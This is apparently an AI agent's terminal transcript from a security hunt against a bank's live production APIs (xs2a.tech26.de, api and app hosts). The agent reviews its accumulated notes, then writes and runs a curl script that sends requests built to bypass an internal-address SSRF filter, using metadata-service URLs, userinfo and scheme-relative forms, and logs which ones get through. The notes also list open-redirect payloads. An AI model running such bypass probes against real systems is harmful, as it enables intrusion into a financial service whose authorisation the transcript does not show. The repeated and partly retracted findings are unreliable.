+knowledge/index.md:993: ...5 ACCEPTED OATH @ xs2a.tech26.de/oauth2/authorize: ALB substring blocklist is query-string-scoped (requires scheme://), not request-scoped; TPP-Redirect-URI header bypasses ALB entirely to application layer (istio-envoy 401). Sandbox tier identical; AS performs no pre-auth discrimination of...
+knowledge/index.md:1002: ...- 2026-10-05 ACCEPTED OATH @ xs2a.tech26.de: redirect_uri blocklist is ALB-level substring filter requiring `scheme://` literal; scheme-relative URIs bypass to application layer (istio-envoy 401) w...
+knowledge/index.md:1016: ...- 2026-10-05 ACCEPTED OATH @ xs2a.tech26.de: AS performs **no** pre-auth discrimination of `TPP-Redirect-*` — four legs all byte-identical 401|0 md5 d41d8cd9...
+inventory/n26.md:1145: ...- NEW xs2a.tech26.de /oauth2/authorize: `redirect_uri` and `response_type` are NOT required to reach the 401 auth gate — AS performs no redirect_uri pre-validation, so redirect_uri binding/whit...
+inventory/n26.md:1145: .../authorize: `redirect_uri` and `response_type` are NOT required to reach the 401 auth gate — AS performs no redirect_uri pre-validation, so redirect_uri binding/whitelist behavio...
+inventory/n26.md:1162: ...h26.de/oauth2/authorize: a THIRD response class exists on the authorize plane — 403 (118B nginx body, `server: awselb/2.0`) — triggered by `redirect_uri` host content, not by `state` as the...
+inventory/n26.md:1163: ...- NEW @ xs2a.tech26.de: the redirect_uri blocklist is enforced at the AWS ALB, not the AS (no istio-envoy headers on the 403) → zero application-layer redirect_uri validation exist...
+inventory/n26.md:1163: ...a.tech26.de: the redirect_uri blocklist is enforced at the AWS ALB, not the AS (no istio-envoy headers on the 403) → zero application-layer redirect_uri validation exists....
+inventory/n26.md:1184: ...- NEW xs2a.tech26.de: Redirect_uri blocklist enforced at AWS ALB (server: awselb/2.0, 118B nginx body) not application layer; blocklist INCOMPLETE — `0x7f.1`, `0x7f.0.0.1`, `...
+inventory/n26.md:1195: ...- NEW xs2a.tech26.de redirect_uri blocklist proven to require `scheme://` literal and perform no URI parsing — `https://127.0.0.1@evil.example/` → 403 (ALB) despite public h...
+inventory/n26.md:1219: ...- NEW xs2a.tech26.de OAuth2 authorization endpoint redirect_uri blocklist confirmed as ALB substring filter requiring `scheme://` literal with no URI parsing: `https://127.0.0.1@evil.example/` → 403 (aws...
+inventory/n26.md:1229: ...- NEW xs2a.tech26.de OAuth2 authorization endpoint redirect_uri blocklist is ALB substring filter requiring `scheme://` literal with no URI parsing — `https://127.0.0.1@evil.example/` → 403 (awselb/2.0)...
+inventory/n26.md:1248: ...- CHANGED aisp.tech26.de + pisp.tech26.de `/oauth2/authorize`: 404 len=0 with full documented param set (client_id+scope+code_challenge+redirect_uri+response_type+state), against a SAME-BATCH live-route control...
+inventory/n26.md:1264: ...EW aisp.tech26.de + pisp.tech26.de: /oauth2/authorize returns 404 len=0 even with full documented param set (client_id+scope+code_challenge+redirect_uri+response_type+state) — no auth plane on fallback h...
+inventory/n26.md:1268: ...CHANGED xs2a.tech26.de: production XS2A API 21 Bearer-gated classes confirmed; mTLS NOT enforced (empty CA list in CertificateRequest); ALB redirect_uri blocklist is substring filter requiring `scheme://` lit...
+inventory/n26.md:1283: ...- NEW xs2a.tech26.de/oauth2/authorize: redirect_uri ALB blocklist bypass CONFIRMED — `https://127.0.0.1@evil.example/` → 403 awselb/2.0; `//169.254.169.254/` → 401 istio-envoy (scheme-relativ...
+inventory/n26.md:1325: ...- CHANGED C1 redirect_uri=https://169.254.169.254/ -> 403 | C4 redirect_uri=https://evil.example/ -> 401...
+inventory/n26.md:1326: ...- NEW xs2a.tech26.de/sandbox/oauth2/authorize: identical ALB redirect_uri blocklist bypass confirmed (scheme-relative `//169.254.169.254/` → 401 istio-envoy) — sandbox co-tenancy on production host verified...
+inventory/n26.md:1354: ...- CHANGED xs2a.tech26.de: Production XS2A API mTLS optional (empty CA list in CertificateRequest) — PASSIVE verified across 4 axes; OAuth redirect_uri ALB substring filter bypass via scheme-relative URIs confir...
+inventory/n26.md:1364: ...- NEW `xs2a.tech26.de` edge — the ALB substring blocklist is **query-string-scoped, not request-scoped**. `TPP-Redirect-URI: http://169.254.169.254/latest/meta-data/` → `401|0` istio-envoy (passes ALB); ide...
+inventory/n26.md:1366: ...- NEW `xs2a.tech26.de` — the AS does **not** discriminate `TPP-Redirect-*` pre-authentication. Four legs, all byte-identical: absent headers → `401|0` md5 `d41d8cd9`; `TPP-Redirect-Preferred: true` with URI...
+inventory/n26.md:1366: ...AS does **not** discriminate `TPP-Redirect-*` pre-authentication. Four legs, all byte-identical: absent headers → `401|0` md5 `d41d8cd9`; `TPP-Redirect-Preferred: true` with URI...
+inventory/n26.md:1371: ...- NEW xs2a.tech26.de: ALB substring blocklist is query-string-scoped, not request-scoped — `TPP-Redirect-URI: http://169.254.169.254/latest/meta-data/` bypasses ALB (401 istio-envoy) while `?foo=https://127...
+inventory/n26.md:1372: ...ever opened (`doc/sandbox.md`, `doc/decoupled/dedicated-cbpii.md`, `doc/redirect/dedicated-aisp.md`) document production redirect flow via `TPP-Redirect-URI` hea...
+inventory/n26.md:1373: ...- NEW xs2a.tech26.de: AS performs no pre-auth discrimination of `TPP-Redirect-*` — four legs (absent, `Preferred` only, `URI: not-a-url`, `URI: 169.254.169.254`) all return 401|0 md5 d41d8cd9...
+inventory/n26.md:1379: ...- NEW xs2a.tech26.de ALB substring blocklist is query-string-scoped, not request-scoped — `TPP-Redirect-URI` header bypasses ALB entirely (401 istio-envoy) while `?foo=https://127.0.0.1@evil.example/` → 403...
+inventory/n26.md:1380: ...orpus files (`doc/sandbox.md`, `doc/decoupled/dedicated-cbpii.md`, `doc/redirect/dedicated-aisp.md`) document production redirect flow via `TPP-Redirect-URI` hea...
+inventory/n26.md:1381: ...- NEW xs2a.tech26.de AS performs zero pre-auth discrimination of `TPP-Redirect-*` headers — four legs (absent, `Preferred` only, `URI: not-a-url`, `URI: 169.254.169.254`) all return 401|0 md5 d41d8cd9...
+inventory/n26.md:1387: ...- NEW xs2a.tech26.de ALB substring blocklist confirmed query-string-scoped — `TPP-Redirect-URI` header bypasses ALB entirely (401 istio-envoy) while `?foo=https://127.0.0.1@evil.example/` → 403 awselb/2.0...
+inventory/n26.md:1389: ...- NEW xs2a.tech26.de AS performs zero pre-auth discrimination of `TPP-Redirect-*` — four legs (absent, `Preferred` only, `URI: not-a-url`, `URI: 169.254.169.254`) all return 401|0 md5 d41d8cd9...
+inventory/n26.md:1403: ...- NEW xs2a.tech26.de ALB substring blocklist is query-string-scoped — `TPP-Redirect-URI` header bypasses ALB entirely (401 istio-envoy) while `?foo=https://127.0.0.1@evil.example/` → 403 awselb/2.0...
+inventory/n26.md:1407: ...- CHANGED xs2a.tech26.de production XS2A API mTLS optional (empty CA list in CertificateRequest) — PASSIVE verified across 4 axes; OAuth redirect_uri ALB substring filter bypass via scheme-relative URIs confirm...
+inventory/n26.md:1435: ...- CHANGED xs2a.tech26.de ALB substring blocklist confirmed query-string-scoped — `TPP-Redirect-URI` header bypasses ALB entirely (401 istio-envoy) while `?foo=https://127.0.0.1@evil.example/` → 403 awselb/2.0...
+inventory/n26.md:1436: ...- CHANGED xs2a.tech26.de AS performs zero pre-auth discrimination of `TPP-Redirect-*` — four legs (absent, `Preferred` only, `URI: not-a-url`, `URI: 169.254.169.254`) all return 401|0 md5 d41d8cd9...
+inventory/n26.md:1451: ...- NEW xs2a.tech26.de: ALB substring blocklist confirmed query-string-scoped — `TPP-Redirect-URI` header bypasses ALB entirely (401 istio-envoy) while `?foo=https://127.0.0.1@evil.example/` → 403 awselb/2.0;...
+inventory/n26.md:1452: ...- NEW xs2a.tech26.de: AS performs zero pre-auth discrimination of `TPP-Redirect-*` — four legs (absent, `Preferred` only, `URI: not-a-url`, `URI: 169.254.169.254`) all return 401|0 md5 d41d8cd9...
+inventory/n26.md:1523: ...- CHANGED xs2a.tech26.de: ALB substring blocklist confirmed query-string-scoped (TPP-Redirect-URI header bypasses ALB entirely); AS performs zero pre-auth discrimination of TPP-Redirect-* headers (four legs all...
+inventory/n26.md:1523: ...string blocklist confirmed query-string-scoped (TPP-Redirect-URI header bypasses ALB entirely); AS performs zero pre-auth discrimination of TPP-Redirect-* headers (four legs all...
+UNIQUE FRAGMENTS: 78
+[0m
+[0m$ [0mcd /home/runner/work/n26-hunt/n26-hunt && echo "=== ctx.txt tail (last 60 lines, truncated) ===" && tail -n 60 ctx.txt | cut -c1-300
+=== ctx.txt tail (last 60 lines, truncated) ===
+- NEW api.tech26.de / beta-api.tech26.de / sapi.tech26.de legacy Bearer-gated gate resolved as GET-scoped wildcard middleware — fabricated `/api/accounts/1/zzqnotreal` → 401|211 byte-identical to live route
+- NEW xs2a.tech26.de Production XS2A API CertificateRequest with EMPTY certificate_authorities list confirmed (optional mTLS, not absent) — openssl s_client shows signature_algorithms only
+- CHANGED flags.n26.com RBAC boundary tightened toward default-deny: `/v1/sdk_exception` now 403|19B (was 202), all GET config routes 403|19B — premise dead
+- CHANGED NO_DELTA on probe surface since 2026-09-18 10:07 UTC (12+ days frozen); probe-results.md only shows repeated `app.n26.com/login?redirect=https://evil.example.com/callback` → 200 len=316307
+- CHANGED Triage feeder degraded 18+ consecutive runs; coordinator credential/scope supply sole unblock for PARKED items
+
+## 2026-10-03 20:17:57 UTC
+
+## 2026-10-03 23:26:46 UTC
+
+## 2026-10-04 02:48:32 UTC
+- NEW xs2a.tech26.de CBPII consent flow confirmed live at `/v1/berlin-group/v1/consents/confirmation-of-funds{,/{id},{id}/status,{id}/authorisations,/authorisations/{id}}` — returns 401|0 with 8-11ms app-la
+- NEW xs2a.tech26.de ALB substring blocklist confirmed query-string-scoped — `TPP-Redirect-URI` header bypasses ALB entirely (401 istio-envoy) while `?foo=https://127.0.0.1@evil.example/` → 403 awselb/2.0
+- NEW xs2a.tech26.de AS performs zero pre-auth discrimination of `TPP-Redirect-*` — four legs (absent, `Preferred` only, `URI: not-a-url`, `URI: 169.254.169.254`) all return 401|0 md5 d41d8cd9
+- NEW app.n26.com/login `redirect` query param copied unvalidated into GraphQL-Relay `__successRedirect` AND `__failureRedirect` hidden inputs (absolute/protocol-relative external hosts accepted); edge filt
+- NEW api.tech26.de / beta-api.tech26.de / sapi.tech26.de legacy Bearer-gated gate resolved as GET-scoped wildcard middleware — fabricated `/api/accounts/1/zzqnotreal` → 401|211 byte-identical to live route
+- NEW xs2a.tech26.de Production XS2A API CertificateRequest with EMPTY certificate_authorities list confirmed (optional mTLS, not absent) — openssl s_client shows signature_algorithms only
+- CHANGED flags.n26.com RBAC boundary tightened toward default-deny: `/v1/sdk_exception` now 403|19B (was 202), all GET config routes 403|19B — premise dead
+- CHANGED NO_DELTA on probe surface since 2026-09-18 10:07 UTC (12+ days frozen); probe-results.md only shows repeated `app.n26.com/login?redirect=https://evil.example.com/callback` → 200
+- CHANGED Triage feeder degraded 18+ consecutive runs; coordinator credential/scope supply sole unblock for PARKED items
+
+## 2026-10-04 09:20:49 UTC
+- NEW xs2a.tech26.de CBPII consent flow confirmed live at `/v1/berlin-group/v1/consents/confirmation-of-funds{,/{id},{id}/status,{id}/authorisations,/authorisations/{id}}` — returns 401|0 with 8-11ms app-la
+- NEW xs2a.tech26.de ALB substring blocklist confirmed query-string-scoped — `TPP-Redirect-URI` header bypasses ALB entirely (401 istio-envoy) while `?foo=https://127.0.0.1@evil.example/` → 403 awselb/2.0
+- NEW xs2a.tech26.de AS performs zero pre-auth discrimination of `TPP-Redirect-*` — four legs (absent, `Preferred` only, `URI: not-a-url`, `URI: 169.254.169.254`) all return 401|0 md5 d41d8cd9
+- NEW api.tech26.de / beta-api.tech26.de / sapi.tech26.de legacy Bearer-gated gate resolved as GET-scoped wildcard middleware — fabricated `/api/accounts/1/zzqnotreal` → 401|211 byte-identical to live route
+- NEW xs2a.tech26.de Production XS2A API CertificateRequest with EMPTY certificate_authorities list confirmed (optional mTLS, not absent) — openssl s_client shows signature_algorithms only
+- CHANGED flags.n26.com RBAC boundary tightened toward default-deny: `/v1/sdk_exception` now 403|19B (was 202), all GET config routes 403|19B — premise dead
+- CHANGED NO_DELTA on probe surface since 2026-09-18 10:07 UTC (12+ days frozen); probe-results.md only shows repeated `app.n26.com/login?redirect=https://evil.example.com/callback` → 200
+- CHANGED Triage feeder degraded 18+ consecutive runs; coordinator credential/scope supply sole unblock for PARKED items
+
+## 2026-10-04 14:53:12 UTC
+
+## 2026-10-04 18:35:34 UTC
+- CHANGED xs2a.tech26.de CBPII consent flow confirmed live at `/v1/berlin-group/v1/consents/confirmation-of-funds` (401|0, 8-11ms app-layer timing vs 1ms bogus 404); vendor corpus documents production redirect 
+- CHANGED xs2a.tech26.de ALB substring blocklist confirmed query-string-scoped — `TPP-Redirect-URI` header bypasses ALB entirely (401 istio-envoy) while `?foo=https://127.0.0.1@evil.example/` → 403 awselb/2.0
+- CHANGED xs2a.tech26.de AS performs zero pre-auth discrimination of `TPP-Redirect-*` — four legs (absent, `Preferred` only, `URI: not-a-url`, `URI: 169.254.169.254`) all return 401|0 md5 d41d8cd9
+- CHANGED api.tech26.de / beta-api.tech26.de / sapi.tech26.de legacy Bearer-gated gate resolved as GET-scoped wildcard middleware — fabricated `/api/accounts/1/zzqnotreal` → 401|211 byte-identical to live route
+- CHANGED xs2a.tech26.de Production XS2A API CertificateRequest with EMPTY certificate_authorities list confirmed (optional mTLS, not absent) — openssl s_client shows signature_algorithms only
+- CHANGED flags.n26.com RBAC boundary tightened toward default-deny: `/v1/sdk_exception` now 403|19B (was 202), all GET config routes 403|19B — premise dead
+- CHANGED NO_DELTA on probe surface since 2026-09-18 10:07 UTC (12+ days frozen); probe-results.md only shows repeated `app.n26.com/login?redirect=https://evil.example.com/callback` → 200
+- CHANGED Triage feeder degraded 18+ consecutive runs; coordinator credential/scope supply sole unblock for PARKED items
+
+## 2026-10-04 22:01:27 UTC
+- NEW probe surface since 2026-09-18 10:07 UTC remains frozen (12+ days); triage feeder degraded 18+ consecutive runs with no new leads
+- CHANGED xs2a.tech26.de: ALB substring blocklist confirmed query-string-scoped (TPP-Redirect-URI header bypasses ALB entirely); AS performs zero pre-auth discrimination of TPP-Redirect-* headers (four legs all
+- CHANGED api.tech26.de / beta-api.tech26.de / sapi.tech26.de: legacy Bearer-gated gate resolved as GET-scoped wildcard middleware (fabricated /api/accounts/1/zzqnotreal → 401|211 byte-identical to live routes)
+- CHANGED app.n26.com/login: redirect query parameter copied unvalidated into GraphQL-Relay __successRedirect and __failureRedirect hidden inputs (absolute/protocol-relative external hosts accepted)
+- CHANGED flags.n26.com: RBAC boundary tightened toward default-deny (/v1/sdk_exception now 403|19B, all GET config routes 403|19B)
+- CHANGED xs2a.tech26.de: Production XS2A API CertificateRequest has EMPTY certificate_authorities list (optional mTLS, not absent); CBPII consent flow confirmed live at /v1/berlin-group/v1/consents/confirmatio
+
+## 2026-10-05 00:29:22 UTC
+- NEW probe surface since 2026-09-18 10:07 UTC remains frozen (12+ days); triage feeder degraded 18+ consecutive runs with no new leads
+- CHANGED xs2a.tech26.de: ALB substring blocklist confirmed query-string-scoped (TPP-Redirect-URI header bypasses ALB entirely); AS performs zero pre-auth discrimination of TPP-Redirect-* headers (four legs all
+- CHANGED api.tech26.de / beta-api.tech26.de / sapi.tech26.de: legacy Bearer-gated gate resolved as GET-scoped wildcard middleware (fabricated /api/accounts/1/zzqnotreal → 401|211 byte-identical to live routes)
+- CHANGED app.n26.com/login: redirect query parameter copied unvalidated into GraphQL-Relay __successRedirect and __failureRedirect hidden inputs (absolute/protocol-relative external hosts accepted)
+- CHANGED flags.n26.com: RBAC boundary tightened toward default-deny (/v1/sdk_exception now 403|19B, all GET config routes 403|19B)
+- CHANGED xs2a.tech26.de: Production XS2A API CertificateRequest has EMPTY certificate_authorities list (optional mTLS, not absent); CBPII consent flow confirmed live at /v1/berlin-group/v1/consents/confirmatio
+- NEW AWB internal-address SSRF filter BYPASS via RFC 3986 userinfo — reproducible on xs2a/api/app, supersedes the mischaracterised "blocklist" that three prior hypotheses rested on
+- NEW filter is request-scoped (path-embedded internal literals ARE blocked), retracting "query-string-scoped"
+[0m
+[0m$ [0mcd /home/runner/work/n26-hunt/n26-hunt && echo "=== userinfo mentions in ctx/knowledge/inventory ===" && grep -Ein 'userinfo|user@|@169\.|@evil\.example' ctx.txt knowledge/index.md inventory/n26.md | cut -c1-260 | tail -n 40
+=== userinfo mentions in ctx/knowledge/inventory ===
+ctx.txt:2550:- NEW xs2a.tech26.de ALB substring blocklist confirmed query-string-scoped — `TPP-Redirect-URI` header bypasses ALB entirely (401 istio-envoy) while `?foo=https://127.0.0.1@evil.example/` → 403 awselb/2.0
+ctx.txt:2562:- CHANGED xs2a.tech26.de ALB substring blocklist confirmed query-string-scoped — `TPP-Redirect-URI` header bypasses ALB entirely (401 istio-envoy) while `?foo=https://127.0.0.1@evil.example/` → 403 awselb/2.0
+ctx.txt:2571:- CHANGED xs2a.tech26.de ALB substring blocklist confirmed query-string-scoped — `TPP-Redirect-URI` header bypasses ALB entirely (401 istio-envoy) while `?foo=https://127.0.0.1@evil.example/` → 403 awselb/2.0
+ctx.txt:2578:- NEW xs2a.tech26.de: ALB substring blocklist confirmed query-string-scoped — `TPP-Redirect-URI` header bypasses ALB entirely (401 istio-envoy) while `?foo=https://127.0.0.1@evil.example/` → 403 awselb/2.0;
+ctx.txt:2590:- NEW xs2a.tech26.de: ALB substring blocklist confirmed query-string-scoped — `TPP-Redirect-URI` header bypasses ALB entirely (401 istio-envoy) while `?foo=https://127.0.0.1@evil.example/` → 403 awselb/2.0
+ctx.txt:2602:- NEW xs2a.tech26.de ALB substring blocklist confirmed query-string-scoped — `TPP-Redirect-URI` header bypasses ALB entirely (401 istio-envoy) while `?foo=https://127.0.0.1@evil.example/` → 403 awselb/2.0
+ctx.txt:2617:- NEW xs2a.tech26.de ALB substring blocklist confirmed query-string-scoped — `TPP-Redirect-URI` header bypasses ALB entirely (401 istio-envoy) while `?foo=https://127.0.0.1@evil.example/` → 403 awselb/2.0
+ctx.txt:2628:- NEW xs2a.tech26.de ALB substring blocklist confirmed query-string-scoped — `TPP-Redirect-URI` header bypasses ALB entirely (401 istio-envoy) while `?foo=https://127.0.0.1@evil.example/` → 403 awselb/2.0
+ctx.txt:2640:- CHANGED xs2a.tech26.de ALB substring blocklist confirmed query-string-scoped — `TPP-Redirect-URI` header bypasses ALB entirely (401 istio-envoy) while `?foo=https://127.0.0.1@evil.example/` → 403 awselb/2.0
+ctx.txt:2663:- NEW AWB internal-address SSRF filter BYPASS via RFC 3986 userinfo — reproducible on xs2a/api/app, supersedes the mischaracterised "blocklist" that three prior hypotheses rested on
+knowledge/index.md:669:- 2026-09-27 ACCEPTED OATH @ xs2a.tech26.de: the redirect_uri blocklist **requires a `scheme://` literal to engage and performs no URI parsing whatsoever**. Proof that it is a non-parsing substring matcher rather than a host-aware filter
+knowledge/index.md:752:- 2026-09-29 REJECTED OTHER @ process, and the sharpest process lesson of this programme: I ran two full cycles (09-26, 09-27) and ~25 requests characterising *how* a filter parses — hex `0x7f.1`, octal, short-form `127.1`, userinfo co
+knowledge/index.md:791:- 2026-09-30 REJECTED OTHER @ xs2a.tech26.de OAuth plane: notation-hunting (hex/octal/userinfo/ports/scheme-relative forms) produced many reproducible bypasses of a generic ALB substring blocklist but did not demonstrate an OAuth redirec
+knowledge/index.md:813:- 2026-10-01 ACCEPTED OATH @ xs2a.tech26.de: the ALB substring blocklist is **query-string-scoped**, not request-scoped, and the field it inspects is not the field the production redirect flow uses. Proven in one batch with paired invent
+knowledge/index.md:816:- 2026-10-01 ACCEPTED OATH @ `xs2a.tech26.de`: the edge substring blocklist is **query-string-scoped**, not request-scoped, and it is a shared rule fronting both `xs2a.tech26.de` and `api.tech26.de`. Proven with invented-field controls i
+knowledge/index.md:998:- 2026-10-05 ACCEPTED MISCONFIG @ AWB-wide: userinfo bypasses the internal-address SSRF filter; filter is request-scoped (path rules exist), retracting "query-string-scoped".
+inventory/n26.md:1195:- NEW xs2a.tech26.de redirect_uri blocklist proven to require `scheme://` literal and perform no URI parsing — `https://127.0.0.1@evil.example/` → 403 (ALB) despite public host; `https://evil.example@127.0.
+inventory/n26.md:1207:- NEW xs2a.tech26.de redirect_uri blocklist proven to require `scheme://` literal and perform no URI parsing — `https://127.0.0.1@evil.example/` → 403 (ALB) despite public host; `https://evil.example@127.0.
+inventory/n26.md:1219:- NEW xs2a.tech26.de OAuth2 authorization endpoint redirect_uri blocklist confirmed as ALB substring filter requiring `scheme://` literal with no URI parsing: `https://127.0.0.1@evil.example/` → 403 (awselb
+inventory/n26.md:1221:- NEW xs2a.tech26.de sandbox tier `/sandbox/oauth2/authorize` shows identical ALB blocklist behavior (403 awselb/2.0 on `127.0.0.1@evil.example`, 401 istio-envoy on `evil.example@127.0.0.1`)
+inventory/n26.md:1229:- NEW xs2a.tech26.de OAuth2 authorization endpoint redirect_uri blocklist is ALB substring filter requiring `scheme://` literal with no URI parsing — `https://127.0.0.1@evil.example/` → 403 (awselb/2.0) des
+inventory/n26.md:1283:- NEW xs2a.tech26.de/oauth2/authorize: redirect_uri ALB blocklist bypass CONFIRMED — `https://127.0.0.1@evil.example/` → 403 awselb/2.0; `//169.254.169.254/` → 401 istio-envoy (scheme-relative bypasses)
+inventory/n26.md:1367:- NEW `api.tech26.de` — the substring blocklist is a **shared edge rule**, not an `xs2a`-only deployment, and it is query-string-scoped on the customer API too. `?foo=https://127.0.0.1@evil.example/` → `403
+inventory/n26.md:1374:- NEW api.tech26.de: Shared edge substring blocklist is query-string-scoped on customer API too — `?foo=https://127.0.0.1@evil.example/` → 403 awselb/2.0; header `X-Foo: https://127.0.0.1@evil.example/` → 4
+inventory/n26.md:1379:- NEW xs2a.tech26.de ALB substring blocklist is query-string-scoped, not request-scoped — `TPP-Redirect-URI` header bypasses ALB entirely (401 istio-envoy) while `?foo=https://127.0.0.1@evil.example/` → 403
+inventory/n26.md:1382:- NEW api.tech26.de shares the same edge substring blocklist (query-string-scoped) — `?foo=https://127.0.0.1@evil.example/` → 403 awselb/2.0; header `X-Foo: https://127.0.0.1@evil.example/` → 401|211 envoy
+inventory/n26.md:1387:- NEW xs2a.tech26.de ALB substring blocklist confirmed query-string-scoped — `TPP-Redirect-URI` header bypasses ALB entirely (401 istio-envoy) while `?foo=https://127.0.0.1@evil.example/` → 403 awselb/2.0
+inventory/n26.md:1390:- NEW api.tech26.de shares same edge substring blocklist (query-string-scoped) — `?foo=https://127.0.0.1@evil.example/` → 403 awselb/2.0; header `X-Foo: https://127.0.0.1@evil.example/` → 401|211 envoy
+inventory/n26.md:1403:- NEW xs2a.tech26.de ALB substring blocklist is query-string-scoped — `TPP-Redirect-URI` header bypasses ALB entirely (401 istio-envoy) while `?foo=https://127.0.0.1@evil.example/` → 403 awselb/2.0
+inventory/n26.md:1413:- NEW xs2a.tech26.de ALB substring blocklist is query-string-scoped — `TPP-Redirect-URI` header bypasses ALB entirely (401 istio-envoy) while `?foo=https://127.0.0.1@evil.example/` → 403 awselb/2.0
+inventory/n26.md:1423:- NEW xs2a.tech26.de ALB substring blocklist confirmed query-string-scoped — `TPP-Redirect-URI` header bypasses ALB entirely (401 istio-envoy) while `?foo=https://127.0.0.1@evil.example/` → 403 awselb/2.0
+inventory/n26.md:1435:- CHANGED xs2a.tech26.de ALB substring blocklist confirmed query-string-scoped — `TPP-Redirect-URI` header bypasses ALB entirely (401 istio-envoy) while `?foo=https://127.0.0.1@evil.example/` → 403 awselb/2.0
+inventory/n26.md:1444:- CHANGED xs2a.tech26.de ALB substring blocklist confirmed query-string-scoped — `TPP-Redirect-URI` header bypasses ALB entirely (401 istio-envoy) while `?foo=https://127.0.0.1@evil.example/` → 403 awselb/2.0
+inventory/n26.md:1451:- NEW xs2a.tech26.de: ALB substring blocklist confirmed query-string-scoped — `TPP-Redirect-URI` header bypasses ALB entirely (401 istio-envoy) while `?foo=https://127.0.0.1@evil.example/` → 403 awselb/2.0;
+inventory/n26.md:1463:- NEW xs2a.tech26.de: ALB substring blocklist confirmed query-string-scoped — `TPP-Redirect-URI` header bypasses ALB entirely (401 istio-envoy) while `?foo=https://127.0.0.1@evil.example/` → 403 awselb/2.0
+inventory/n26.md:1475:- NEW xs2a.tech26.de ALB substring blocklist confirmed query-string-scoped — `TPP-Redirect-URI` header bypasses ALB entirely (401 istio-envoy) while `?foo=https://127.0.0.1@evil.example/` → 403 awselb/2.0
+inventory/n26.md:1490:- NEW xs2a.tech26.de ALB substring blocklist confirmed query-string-scoped — `TPP-Redirect-URI` header bypasses ALB entirely (401 istio-envoy) while `?foo=https://127.0.0.1@evil.example/` → 403 awselb/2.0
+inventory/n26.md:1501:- NEW xs2a.tech26.de ALB substring blocklist confirmed query-string-scoped — `TPP-Redirect-URI` header bypasses ALB entirely (401 istio-envoy) while `?foo=https://127.0.0.1@evil.example/` → 403 awselb/2.0
+inventory/n26.md:1513:- CHANGED xs2a.tech26.de ALB substring blocklist confirmed query-string-scoped — `TPP-Redirect-URI` header bypasses ALB entirely (401 istio-envoy) while `?foo=https://127.0.0.1@evil.example/` → 403 awselb/2.0
+inventory/n26.md:1536:- NEW AWB internal-address SSRF filter BYPASS via RFC 3986 userinfo — reproducible on xs2a/api/app, supersedes the mischaracterised "blocklist" that three prior hypotheses rested on
+[0m
+[0m$ [0mcd /home/runner/work/n26-hunt/n26-hunt && timeout 25 curl -sS -o /dev/null -w 'code=%{http_code} len=%{size_download} t=%{time_total}\n' 'https://xs2a.tech26.de/v1/berlin-group/v1/consents/confirmation-of-funds' 2>&1 | tail -3
+code=401 len=0 t=0.466973
+[0m
+[0m$ [0mcd /home/runner/work/n26-hunt/n26-hunt && ls -d n26* psd2* 2>/dev/null; find / -maxdepth 6 -type d \( -name 'psd2*' -o -name 'n26' \) -not -path '*/work/n26-hunt*' 2>/dev/null | head; echo "---reposcan-raw---"; ls reposcan-raw/ | head -20
+---reposcan-raw---
+summary.txt
+[0m
+Network is live and the vendor doc corpus isn't local. Running one rate-limited (≤1 rps) channel-differential batch to resolve the query/path/header taxonomy that the KB still contradicts.
+[0m$ [0mcd /home/runner/work/n26-hunt/n26-hunt && cat > /tmp/opencode/chan.sh <<'EOF'
+#!/bin/bash
+B='https://xs2a.tech26.de/v1/berlin-group/v1/consents/confirmation-of-funds'
+run(){ # $1=label $2=url $3=header(optional)
+  sleep 1.3
+  if [ -n "$3" ]; then
+    out=$(timeout 20 curl -sS -D /tmp/opencode/h.txt -o /tmp/opencode/b.bin -H "$3" "$2" 2>&1)
+  else
+    out=$(timeout 20 curl -sS -D /tmp/opencode/h.txt -o /tmp/opencode/b.bin "$2" 2>&1)
+  fi
+  code=$(awk 'NR==1{print $2}' /tmp/opencode/h.txt)
+  srv=$(grep -i '^server:' /tmp/opencode/h.txt | head -1 | tr -d '\r')
+  len=$(wc -c < /tmp/opencode/b.bin)
+  md5=$(md5sum /tmp/opencode/b.bin | cut -c1-8)
+  printf '%-34s code=%-4s len=%-5s md5=%-9s %s\n' "$1" "$code" "$len" "$md5" "${srv:-server=<none>}"
+}
+run C6-baseline-noParam      "$B"
+run C1-query-literal        "$B?foo=http://169.254.169.254/"
+run C2-header-literal       "$B" "TPP-Redirect-URI: http://169.254.169.254/latest/meta-data/"
+run C3-path-literal         "https://xs2a.tech26.de/v1/berlin-group/v1/consents/http://169.254.169.254/"
+run C4-query-userinfo       "$B?foo=http://user@169.254.169.254/"
+run C5-header-userinfo      "$B" "TPP-Redirect-URI: http://user@169.254.169.254/latest/meta-data/"
+run C7-query-userinfo-schemeRel "$B?foo=//user@169.254.169.254/"
+EOF
+chmod +x /tmp/opencode/chan.sh && /tmp/opencode/chan.sh
+C6-baseline-noParam                code=401  len=0     md5=d41d8cd9  server: istio-envoy
+C1-query-literal                   code=403  len=118   md5=bad2e857  server: awselb/2.0
+C2-header-literal                  code=401  len=0     md5=d41d8cd9  server: istio-envoy
+C3-path-literal                    code=403  len=118   md5=bad2e857  server: awselb/2.0
+C4-query-userinfo                  code=401  len=0     md5=d41d8cd9  server: istio-envoy
+C5-header-userinfo                 code=401  len=0     md5=d41d8cd9  server: istio-envoy
+C7-query-userinfo-schemeRel        code=401  len=0     md5=d41d8cd9  server: istio-envoy
+[0m
+[0m$ [0mcd /home/runner/work/n26-hunt/n26-hunt && python3 - <<'PY'
+import re
+p='knowledge/index.md'
+lines=open(p,encoding='utf-8',errors='replace').read().split('\n')
+for n in (813,816,817,998,1002,1016):
+    t=lines[n-1]
+    # split on ' | ' bullets
+    print(f"===== {p}:{n} =====")
+    for seg in re.split(r'\s\|\s(?=[a-z])', t):
+        seg=seg.strip()
+        if seg: print("  -", seg[:700])
+PY
+===== knowledge/index.md:813 =====
+  - - 2026-10-01 ACCEPTED OATH @ xs2a.tech26.de: the ALB substring blocklist is **query-string-scoped**, not request-scoped, and the field it inspects is not the field the production redirect flow uses. Proven in one batch with paired invented-field controls in both directions: query `foo=https://127.0.0.1@evil.example/` → `403|118` awselb/2.0 (field-agnostic, confirmed 09-29), while header `X-Foo: https://127.0.0.1@evil.example/` → `401|0` istio-envoy and header `TPP-Redirect-URI: http://169.254.169.254/latest/meta-data/` → `401|0` (headers not inspected). This **supersedes** the 09-29 retraction: that entry was right that no OAuth control was bypassed *in the query parameter*, and wrong to con
+===== knowledge/index.md:816 =====
